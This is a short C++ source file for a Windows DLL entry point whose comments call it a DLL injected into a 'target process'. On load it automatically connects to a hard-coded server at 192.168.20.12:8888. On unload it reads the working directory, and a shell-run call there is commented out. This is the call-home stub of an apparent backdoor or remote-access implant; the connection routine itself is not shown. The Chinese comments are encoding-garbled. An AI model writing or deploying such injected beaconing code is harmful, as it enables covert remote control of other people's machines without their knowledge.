#include  <direct.h>
#include"main.h"
extern "C" BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
	{
		//MessageBox(NULL, _T("DLL�ѽ���Ŀ����̡�"), _T("��Ϣ"), MB_ICONINFORMATION);
		list<char *> ips = { "192.168.20.12" };
		ConnectServer(ips, 8888);
	}
	break;
	case DLL_PROCESS_DETACH:
	{
		//MessageBox(NULL, _T("DLL�Ѵ�Ŀ�����ж�ء�"), _T("��Ϣ"), MB_ICONINFORMATION);
		char filePath[MAX_PATH];
		_getcwd(filePath, MAX_PATH);
		//ShellRun(filePath, "", 0);
		MessageBox(NULL, _T("filePath"), _T("��Ϣ"), MB_ICONINFORMATION);
	}
	break;
	}
	return TRUE;
}